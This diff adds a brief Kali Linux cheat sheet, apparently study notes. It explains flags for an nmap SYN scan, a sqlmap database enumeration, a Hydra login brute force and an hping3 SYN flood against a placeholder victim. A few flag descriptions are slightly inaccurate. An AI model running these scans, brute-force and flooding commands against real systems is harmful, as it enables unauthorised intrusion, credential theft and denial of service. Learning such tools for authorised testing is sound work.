@@ -1,0 +1,24 @@
+# All attacks built-in to Kali
+# Nmap SYN/Stealth Scan
+nmap -sS -p- -T4 <victim_ip>
+-sS: specifies SYN/stealth scan
+-p-: scan all ports
+-T4: use the 2nd fastest scan mode (T1 is slowest, T5 is fastest)
+
+# SQLmap
+sqlmap -u "http://<victim_ip>/login.php" --data="username=admin&password=test" --dbs
+-u: specify target url
+--data: specifies the POST request with given username and password parameters
+--dbs: if successful, enumerate databases
+
+# Hydra Brute Force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <victim_ip> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
+-l: specifies fixed username to brute force
+-P: path to directory with rockyou.txt(passwords list)
+:username=^USER^&password=^PASS^: specifies login form for hydra and where to put username and passwords
+:Invalid username or password": specifies error message, hydra will keep running until out of passwords or a page without this error shows(e.g. login successful page)
+
+hping3 -S -p 80 --flood <victim_ip>
+-S: SYN flags
+-p 80: target port 80 (HTTP port)
+--flood: send packets as quickly as possible
